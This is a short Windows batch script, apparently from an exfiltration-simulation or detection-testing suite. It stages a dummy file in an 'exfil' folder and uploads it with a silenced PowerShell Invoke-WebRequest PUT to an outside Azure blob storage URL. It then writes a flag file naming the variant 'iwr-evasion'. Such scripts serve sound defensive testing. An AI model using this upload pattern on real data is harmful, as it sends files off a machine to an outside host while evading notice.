@echo off
set EXFIL_DIR=%USERPROFILE%\bops4048\exfil
if not exist "%EXFIL_DIR%" mkdir "%EXFIL_DIR%"
if not exist "%EXFIL_DIR%\part1.dat" echo dummy > "%EXFIL_DIR%\part1.dat"
powershell.exe -Command "Invoke-WebRequest -Uri 'https://nebuchadnezzar.blob.core.windows.net/oracle/neo-6447686c63.bin?sv=2024-01-01&sig=xxx' -Method PUT -InFile '%EXFIL_DIR%\part1.dat' -Headers @{'x-ms-blob-type'='BlockBlob'} -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null"
ver >nul
> "%EXFIL_DIR%\stage-01.flag" (
  echo variant=01-sdk-iwr-evasion
  echo carrier=neo-6447686c63.bin
  echo writer=powershell.exe
  echo timestamp=%DATE% %TIME%
)
exit /b 0
